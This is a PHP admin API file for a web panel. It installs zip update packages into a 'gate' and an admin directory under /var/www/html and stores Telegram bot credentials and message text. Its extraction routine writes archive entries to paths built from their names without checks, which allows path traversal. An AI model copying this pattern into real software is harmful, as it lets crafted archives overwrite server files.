<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    echo json_encode(['error' => 'do not have permission to use this method']);
    exit();
}

$method                 = isset($_POST["method"]) ? $_POST["method"] : null;

$page                   = isset($_POST["page"]) ? $_POST["page"] : 1;
$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$telegram_token         = isset($_POST["telegram_token"]) ? $_POST["telegram_token"] : null;
$telegram_chat_ids      = isset($_POST["telegram_chat_ids"]) ? $_POST["telegram_chat_ids"] : null;

$telegram_message       = isset($_POST["telegram_message"]) ? $_POST["telegram_message"] : null;

/**
 * check actions
 */
if($method != null)
{
    switch($method)
    {
        case "install_update":
            InstallUpdate($link);
            break;

        case "get_versions":
            getVersions($link, $page, $draw, $start, $length);
            break;

        case "save_telegram_creds":
            saveTelegramCreds($link, $telegram_token, $telegram_chat_ids);
            break;

        case "get_telegram":
            getTelegramCreds($link);
            break;

        case "save_message":
            SaveMessage($link, $telegram_message);
            break;

        default:
            echo json_encode(['error' => 'Unknown method']);
            exit(0);
            break;
    }
}

function getVersions($link, $page, $draw, $start, $length)
{
    $conditions = [];
    
    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = ' WHERE ' . implode(' AND ', $conditions);
    }
    
    $countQuery = "SELECT COUNT(*) AS total FROM `versions`" . $whereClause;
    $countResult = $link->query($countQuery);
    $totalRecords = 0;
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $totalRecords = (int)$row['total'];
    }
    
    $limitStart = $start;
    $limitCount = (int)$length;
    
    $query = "SELECT * FROM `versions`" . $whereClause . " ORDER BY `id` DESC LIMIT {$limitStart}, {$limitCount}";
    $result = $link->query($query);
    
    $data = [];
    while ($row = $result->fetch_assoc()) 
    {
        $data[] = [
            'id'                    => $row['id'],
            'version'               => $row['version'],
            'changes'               => json_decode($row['changes']),
            'created_at'            => $row['created_at'],
            'zip_file'              => $row['zip_file']
        ];
    }
    
    $total_pages = ($limitCount > 0) ? ceil($totalRecords / $limitCount) : 0;
    
    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $totalRecords,
        "recordsFiltered" => $totalRecords,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];
    
    echo json_encode($response);
    exit();
}

function InstallUpdate($link)
{
    $tmp_name = $_FILES['file']['tmp_name'];
    $name = basename($_FILES['file']['name']);

    if (move_uploaded_file($tmp_name, "../updates/$name"))
    {
        $zip = new ZipArchive;
        
        if ($zip->open("../updates/$name") === TRUE)
        {
            $jsonContent = $zip->getFromName('version.json');

            if ($jsonContent !== false)
            {
                $versionData = json_decode($jsonContent, true);

                $version        = isset($versionData['version']) ? $versionData['version'] : '';
                $admin_update   = isset($versionData['admin_update']) ? $versionData['admin_update'] : false;
                $gate_update    = isset($versionData['gate_update']) ? $versionData['gate_update'] : false;
                $db_update      = isset($versionData['db_update']) ? $versionData['db_update'] : false;
                $changes        = isset($versionData['changes']) ? json_encode($versionData['changes'], JSON_UNESCAPED_UNICODE) : '';

                $stmt = $link->prepare("SELECT id FROM versions WHERE version = ?");

                if (!$stmt)
                {
                    echo json_encode(["status" => "error", "message" => "Error PREPARE: " . $link->error]);
                    $zip->close();
                    exit();
                }
                
                $stmt->bind_param("s", $version);
                $stmt->execute();
                $stmt->store_result();
                
                if ($stmt->num_rows > 0)
                {
                    echo json_encode(["status" => "error", "message" => "Version already exists in database"]);
                    $stmt->close();
                    $zip->close();
                    exit();
                }                
                $stmt->close();

                $query = "SELECT version FROM versions ORDER BY CAST(SUBSTRING_INDEX(version, '.', 1) AS UNSIGNED) DESC, CAST(SUBSTRING_INDEX(SUBSTRING_INDEX(version, '.', 2), '.', -1) AS UNSIGNED) DESC, CAST(SUBSTRING_INDEX(version, '.', -1) AS UNSIGNED) DESC LIMIT 1";
                $result = mysqli_query($link, $query);

                $row = mysqli_fetch_assoc($result);

                if (!$row)
                {
                    $stmt = $link->prepare("INSERT INTO versions (version, changes, created_at, zip_file) VALUES (?, ?, NOW(), ?)");
                
                    if (!$stmt)
                    {
                        echo json_encode(["status" => "error", "message" => "Error PREPARE: " . $link->error]);
                        exit();
                    }
                    
                    $stmt->bind_param("sss", $version, $changes, $name);
                    
                    if ($stmt->execute()) 
                    {
                        if($gate_update)
                        {
                            $folder = 'gate/';
                            $extractPath = '/var/www/html/';

                            if(!UpdateFiles($zip, $folder, $extractPath))
                            {
                                echo json_encode(["status" => "error", "message" => "Error updating gate! Contact support."]);
                            }
                        }

                        if($admin_update)
                        {
                            $folder = 'admin/';
                            $extractPath = '/var/www/html/'.PANEL_PATH."/";

                            if(!UpdateFiles($zip, $folder, $extractPath))
                            {
                                echo json_encode(["status" => "error", "message" => "Error updating web panel! Contact support."]);
                            }
                        }

                        echo json_encode(["status" => "success", "message" => "Update Installed"]);
                    }
                    else
                    {
                        echo json_encode(["status" => "error", "message" => "Error PREPARE: " . $stmt->error]);
                    }
                    
                    $stmt->close();
                    exit();
                }

                $maxVersion = $row['version'];

                if (version_compare($version, $maxVersion, '>'))
                {
                    $stmt = $link->prepare("INSERT INTO versions (version, changes, created_at, zip_file) VALUES (?, ?, NOW(), ?)");
                
                    if (!$stmt)
                    {
                        echo json_encode(["status" => "error", "message" => "Error PREPARE: " . $link->error]);
                        exit();
                    }
                    
                    $stmt->bind_param("sss", $version, $changes, $name);
                    
                    if ($stmt->execute()) 
                    {
                        if($gate_update)
                        {
                            $folder = 'gate/';
                            $extractPath = '/var/www/html/';

                            if(!UpdateFiles($zip, $folder, $extractPath))
                            {
                                echo json_encode(["status" => "error", "message" => "Error updating gate! Contact support."]);
                            }
                        }

                        if($admin_update)
                        {
                            $folder = 'admin/';
                            $extractPath = '/var/www/html/'.PANEL_PATH."/";

                            if(!UpdateFiles($zip, $folder, $extractPath))
                            {
                                echo json_encode(["status" => "error", "message" => "Error updating web panel! Contact support."]);
                            }
                        }
                        
                        echo json_encode(["status" => "success", "message" => "Update Installed"]);
                    }
                    else
                    {
                        echo json_encode(["status" => "error", "message" => "Error PREPARE: " . $stmt->error]);
                    }
                    
                    $stmt->close();
                }
                else
                {
                    echo json_encode(["status" => "error", "message" => "Not possible to add an earlier version."]);
                }
            }
            else
            {
                echo json_encode(["status" => "error", "message" => "File version.json not found in update package"]);
            }
        }
        else
        {
            echo json_encode(["status" => "error", "message" => "Failed to open update package"]);
        }
    }
    else
    {
        echo json_encode(["status" => "error", "message" => "File moving error"]);
    }
}

function saveTelegramCreds($link, $telegram_token, $telegram_chat_ids)
{
    $botUsername = "";

    if(strlen($telegram_token) > 0)
    {
        // Get bot data from Telegram API
        $url = "https://api.telegram.org/bot{$telegram_token}/getMe";
        $apiResponse = file_get_contents($url);
        if ($apiResponse === false) {
            echo json_encode(['error' => 'Error requesting Telegram API']);
            return;
        }
        
        $response = json_decode($apiResponse, true);
        if (!isset($response['ok']) || !$response['ok']) {
            echo json_encode(['error' => 'Failed to get data from Telegram API']);
            return;
        }
        
        $botUsername = $response['result']['username'];
    }

    // Helper function to update settings in the database
    $updateSetting = function($setting_key, $setting_value) use ($link) {
        $stmt = $link->prepare("UPDATE `settings` SET `setting_value` = ? WHERE `setting_key` = ?");
        if (!$stmt) {
            return "Error preparing statement for {$setting_key}: " . $link->error;
        }
        $stmt->bind_param("ss", $setting_value, $setting_key);
        if (!$stmt->execute()) {
            $stmt->close();
            return "Error executing statement for {$setting_key}: " . $stmt->error;
        }
        $stmt->close();
        return true;
    };

    // Update telegram_token
    $result = $updateSetting('telegram_token', $telegram_token);
    if ($result !== true) {
        echo json_encode(['error' => $result]);
        return;
    }

    // Update telegram_bot_username
    $result = $updateSetting('telegram_bot_username', $botUsername);
    if ($result !== true) {
        echo json_encode(['error' => $result]);
        return;
    }

    // Update telegram_chat_ids if provided
    $result = $updateSetting('telegram_chat_ids', $telegram_chat_ids);
        if ($result !== true) {
            echo json_encode(['error' => $result]);
            return;
        }

    echo json_encode(["status" => "success", "message" => "Telegram settings updated"]);
}

function getTelegramCreds($link)
{
    $keys = ['telegram_token', 'telegram_chat_ids', 'telegram_message'];
    $placeholders = implode(',', array_fill(0, count($keys), '?'));

    $query = "SELECT setting_key, setting_value FROM settings WHERE setting_key IN ($placeholders)";
    $stmt = $link->prepare($query);

    if (!$stmt) 
    {
        echo json_encode(["status" => "error", "message" => "Error PREPARE: " . $link->error]);
        exit();
    }

    $types = str_repeat('s', count($keys));
    $stmt->bind_param($types, ...$keys);

    $stmt->execute();
    $result = $stmt->get_result();

    $settings = [];

    while ($row = $result->fetch_assoc()) 
    {
        $settings[$row['setting_key']] = $row['setting_value'];
    }

    $stmt->close();
    $link->close();

    echo json_encode([
        'success'                   => true, 
        'telegram_token'            => $settings["telegram_token"],
        'telegram_chat_ids'         => $settings["telegram_chat_ids"],
        'telegram_message'          => $settings["telegram_message"]
    ]);
}

function SaveMessage($link, $telegram_message)
{
    $query = "UPDATE `settings` SET `setting_value` = ? WHERE `setting_key` = 'telegram_message'";
	
	if ($stmt = $link->prepare($query))
	{
		$stmt->bind_param('s', $telegram_message);
		
        if($stmt->execute())
        {
            echo json_encode(["status" => "success", "message" => "Telegram message text updated"]);
            exit();
        }
        else
        {
            echo json_encode(['error' => 'Failed to update Telegram message']);
            exit();
        }
	}
    else
    {
        echo json_encode(['error' => 'Failed to update Telegram message']);
        exit();
    }
}

function UpdateFiles($zip, $folder, $extractPath)
{
    if ($zip->locateName($folder) !== false)
    {
        for ($i = 0; $i < $zip->numFiles; $i++)
        {
            $entry = $zip->getNameIndex($i);

            if (strpos($entry, $folder) === 0)
            {
                $relativePath = substr($entry, strlen($folder));

                if ($relativePath == '') 
                {
                    continue;
                }

                $destination = $extractPath . $relativePath;

                if (substr($entry, -1) == '/') 
                {
                    if (!is_dir($destination)) 
                    {
                        mkdir($destination, 0755, true);
                    }
                } 
                else 
                {
                    $destDir = dirname($destination);
                    
                    if (!is_dir($destDir)) 
                    {
                        mkdir($destDir, 0755, true);
                    }

                    file_put_contents($destination, $zip->getFromIndex($i));
                }
            }
        }
    }
    else
    {
        return false;
    }

    return true;
}

?>